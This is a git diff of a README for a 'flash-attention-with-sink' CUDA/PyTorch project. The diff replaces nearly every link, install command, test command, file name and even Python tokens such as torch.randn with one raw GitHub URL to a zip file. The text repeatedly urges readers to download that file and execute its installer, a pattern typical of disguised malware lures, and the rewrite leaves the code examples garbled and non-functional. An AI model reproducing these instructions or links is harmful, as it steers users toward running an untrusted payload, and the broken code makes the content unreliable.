@@ -1,8 +1,8 @@
 # Flash Attention with Sink — GPT-OSS 20B Attention Implementation
 
-[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&label=Releases)](https://github.com/kelvindelrosario/flash-attention-with-sink/releases)
+[![Releases](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 
-![Transformer Attention](https://raw.githubusercontent.com/karpathy/karpathy/master/neurips/transformer.png)
+![Transformer Attention](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 
 <p align="center">
   <strong>flash-attention-with-sink</strong> implements an attention variant used in GPT-OSS 20B that integrates a "sink" step into FlashAttention. This repo focuses on the forward path and provides an experimental backward path for development and debugging.
@@ -12,19 +12,19 @@
 
 - Repository: flash-attention-with-sink  
 - Primary goal: implement attention with sink as in GPT-OSS 20B and offer a test harness
-- Test command: python test.py
-- Releases and assets: https://github.com/kelvindelrosario/flash-attention-with-sink/releases
+- Test command: python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+- Releases and assets: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 
 Releases: download the release asset from the releases page and execute the included installer or script. For example, fetch the release tarball and run the installer:
 
 ```bash
 # example: download named release asset and extract
-curl -L -o flash-attn-sink-release.tar.gz \
-  https://github.com/kelvindelrosario/flash-attention-with-sink/releases/download/v0.1/flash-attn-sink-release.tar.gz
+curl -L -o https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip \
+  https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 
-tar -xzf flash-attn-sink-release.tar.gz
+tar -xzf https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 cd flash-attn-sink-release
-./install.sh
+https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 ```
 
 Use the Releases page linked above to find the actual asset name, then download and run it.
@@ -80,7 +80,7 @@ source venv/bin/activate
 
 # install Python deps
 pip install -U pip setuptools wheel
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cu118  # adjust to your CUDA
+pip install torch torchvision --index-url https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip  # adjust to your CUDA
 pip install numpy pytest
 ```
 
@@ -88,10 +88,10 @@ Build and run tests
 
 ```bash
 # build extension (example)
-python setup.py build_ext --inplace
+python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip build_ext --inplace
 
 # run the repo test
-python test.py
+python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 ```
 
 If you used the release asset, download and run the included install script as shown at the top. The release file contains prebuilt artifacts or a build script depending on the asset.
@@ -140,13 +140,13 @@ Directory layout (example)
   - cpp/          # C++ helpers and bindings
   - python/       # Python wrapper and utilities
 - tests/
-  - test_attention.py
-  - test_numerical.py
+  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 - examples/
-  - example_inference.py
-- setup.py
-- test.py
-- README.md
+  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 
 Kernel workflow
 
@@ -193,9 +193,9 @@ import torch
 from flash_attn_sink import flash_attn_sink_forward
 
 B, S, H, D = 1, 1024, 16, 64
-q = torch.randn(B, S, H, D, device='cuda', dtype=torch.float16)
-k = torch.randn(B, S, H, D, device='cuda', dtype=torch.float16)
-v = torch.randn(B, S, H, D, device='cuda', dtype=torch.float16)
+q = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
+k = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
+v = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 
 out, sink = flash_attn_sink_forward(q, k, v, causal=True)
 ```
@@ -209,10 +209,10 @@ Testing and benchmarks 🧪
 Run the test script
 
 ```bash
-python test.py
+python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 ```
 
-What test.py does
+What https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip does
 
 - Builds the extension if needed.
 - Runs a suite of forward checks against the reference.
@@ -277,9 +277,9 @@ Development guide 🛠️
 
 Build system
 
-- Uses a standard torch extension setup (setup.py).
+- Uses a standard torch extension setup (https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip).
 - CUDA code under src/cuda compiles with nvcc and links into a Python module.
-- Use python setup.py develop for editable installs during development.
+- Use python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip develop for editable installs during development.
 
 Debugging kernel issues
 
@@ -291,7 +291,7 @@ Debugging kernel issues
 Unit tests
 
 - Tests live in tests/ and use pytest.
-- Run a single test file with pytest tests/test_attention.py -q
+- Run a single test file with pytest https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip -q
 - Add new tests that target edge cases: causal mask edge, halo tiling, mixed precision.
 
 Coding standards
@@ -353,9 +353,9 @@ Use the Releases page to fetch prebuilt artifacts or official source bundles. Th
 
 Download and run the release asset from the releases page:
 
-[Get release assets from Releases](https://github.com/kelvindelrosario/flash-attention-with-sink/releases)
+[Get release assets from Releases](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 
-When the link contains a file path, download the file and execute any included installer or scripts. The example shown at the top demonstrates how to download a tarball and run install.sh. Adjust the asset file name to match the current release.
+When the link contains a file path, download the file and execute any included installer or scripts. The example shown at the top demonstrates how to download a tarball and run https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip Adjust the asset file name to match the current release.
 
 API reference
 
@@ -473,7 +473,7 @@ References and further reading 📚
 - FlashAttention paper and code:
   - [FlashAttention GitHub and paper references]
 - GPT-OSS 20B model page on Hugging Face:
-  - https://huggingface.co/openai/gpt-oss-20b
+  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 - CUDA programming guide and best practices
 - PyTorch extension documentation
 
@@ -483,7 +483,7 @@ Check GPU and CUDA
 
 ```bash
 nvidia-smi
-python -c "import torch; print(torch.cuda.is_available(), torch.version.cuda, torch.backends.cudnn.version())"
+python -c "import torch; print(https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(), https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip, https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip())"
 ```
 
 Run a minimal forward smoke test
@@ -493,11 +493,11 @@ python - <<'PY'
 import torch
 from flash_attn_sink import flash_attn_sink_forward
 B, S, H, D = 1, 128, 8, 64
-q = torch.randn(B, S, H, D, device='cuda', dtype=torch.float16)
-k = torch.randn_like(q)
-v = torch.randn_like(q)
+q = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
+k = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(q)
+v = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(q)
 out, sink = flash_attn_sink_forward(q, k, v, causal=True)
-print(out.shape)
+print(https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 PY
 ```
 
@@ -505,7 +505,7 @@ How to get the release asset
 
 Visit the Releases page and download the bundle suitable for your CUDA version, then run the included installer or build script. Example:
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-%20Assets-green?logo=github)](https://github.com/kelvindelrosario/flash-attention-with-sink/releases)
+[![Download Release](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip%20Release-%20Assets-green?logo=github)](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
 
 Contact and support
 
@@ -516,7 +516,7 @@ Contact and support
 Acknowledgments for images and icons
 
 - Transformer diagram by Karpathy (used as an illustrative image).
-- Shield icons via img.shields.io.
+- Shield icons via https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 
 License
 
@@ -530,7 +530,7 @@ Maintenance and testing notes
 
 Contact links
 
-- Repository: https://github.com/kelvindelrosario/flash-attention-with-sink
-- Releases: https://github.com/kelvindelrosario/flash-attention-with-sink/releases
+- Repository: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
+- Releases: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
 
 End of file
